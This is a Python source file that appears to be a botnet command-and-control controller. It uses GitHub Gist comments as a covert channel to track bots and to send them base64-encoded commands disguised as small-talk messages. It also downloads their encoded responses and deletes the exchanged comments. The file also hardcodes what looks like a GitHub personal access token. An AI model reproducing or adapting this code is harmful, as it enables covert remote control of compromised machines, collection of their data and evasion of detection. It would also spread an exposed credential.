import base64
from datetime import datetime, timezone
from dateutil import parser as dt_parser
import time
import requests
import _thread

GIST_ID = "5a2a81be0b757f8fd0fef8d987806a08"
token = "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"


# bots[key:bot_gist_id, values:(updated_at, [(comment_id,response)])]


def delete_bot(bot_comment_id):
    headers = {"Authorization": f"Bearer {token}"}
    endpoint = f"https://api.github.com/gists/{GIST_ID}/comments/{bot_comment_id}"
    r = requests.delete(endpoint, headers=headers)


def check_for_new_bots_and_heartbeats(bots):
    headers = {"Authorization": f"Bearer {token}"}
    endpoint = f"https://api.github.com/gists/{GIST_ID}/comments"
    r = requests.get(endpoint, headers=headers)
    if r.status_code == 200:
        for comment in r.json():
            bot_gist_id = comment['body'].split(" ")[-1]
            bot_comment_id = comment['id']
            updated_at = dt_parser.parse(comment['updated_at']).astimezone(timezone.utc)
            if bot_gist_id not in bots.keys():
                bots[bot_gist_id] = {'updated_at': updated_at.timestamp(), 'bot_comment_id': bot_comment_id,
                                     'requests': {}}
                # val = {bot_gist_id: {'updated_at': updated_at.timestamp(), 'bot_comment_id': bot_comment_id,
                #                      'requests': {}}}
                # bots.update(val)
            else:
                now = datetime.now(timezone.utc)
                difference = now - updated_at
                if difference.total_seconds() > 300:
                    delete_bot(bot_comment_id)
                    bots.pop(bot_gist_id)
                else:
                    # update_val = updated_at.timestamp()
                    # bots.update({bot_gist_id: {'updated_at': update_val}})
                    bots[bot_gist_id]['updated_at'] = updated_at.timestamp()


def delete_bot_comments(controller_comment_id, bot_comment_id, bot_gist_id):
    headers = {"Authorization": f"Bearer {token}"}
    requests.delete(f"https://api.github.com/gists/{bot_gist_id}/comments/{bot_comment_id}", headers=headers)
    requests.delete(f"https://api.github.com/gists/{bot_gist_id}/comments/{controller_comment_id}", headers=headers)


def download_responses(bots):
    headers = {"Authorization": f"Bearer {token}"}
    for bot in bots:
        endpoint = f"https://api.github.com/gists/{bot}/comments"
        r = requests.get(endpoint, headers=headers)
        if r.status_code == 200:
            comments = r.json()
            for comment in comments:
                comment_body = comment['body']
                split_body = comment_body.split(' ')
                if split_body[0] == 'Hey,':
                    continue
                comment_id = split_body[-1]
                response = split_body[-2]
                if response == "with":
                    decoded_response = comment_body
                    # update_dic = {bot: {'requests': {comment_id: response}}}
                else:
                    decoded_response = base64.b64decode(response).decode("utf-8")
                    # update_dic = {bot: {'requests': {comment_id: decoded_response}}}
                bots[bot]['requests'][comment_id] = decoded_response
                # bots.update(update_dic)
                delete_bot_comments(comment_id, comment['id'], bot)


def send_request(parsed_command, bots):
    headers = {"Authorization": f"Bearer {token}"}
    for bot in bots:
        endpoint = f"https://api.github.com/gists/{bot}/comments"
        body = {'body': f"Hey, {parsed_command} lovely weather today, ay?"}
        r = requests.post(endpoint, headers=headers, json=body)
        print(bot, r.status_code)


def parse_command(command):
    return base64.b64encode(bytes(command, encoding="utf-8"))


def write_to_file(bots):
    with open(f"bot_contents_{datetime.now().strftime('%Y%m%d-%H%M%S')}.txt", "w") as f:
        f.write(str(bots))


def handle_user_command(bots):
    console_input = input("Gimme command, im drunk af, cuz it's new year: ")
    if console_input == "exit":
        write_to_file(bots)
        quit()
    parsed_command = parse_command(console_input).decode("utf-8")
    send_request(parsed_command, bots)


def run_background_task(bots):
    try:
        while True:
            check_for_new_bots_and_heartbeats(bots)
            download_responses(bots)
            time.sleep(15)
    except Exception as e:
        with open("bot_exception.txt", "w") as f:
            f.write(str(e))


def run():
    bots = {}
    _thread.start_new_thread(run_background_task, (bots,))
    while True:
        handle_user_command(bots)


if __name__ == "__main__":
    run()
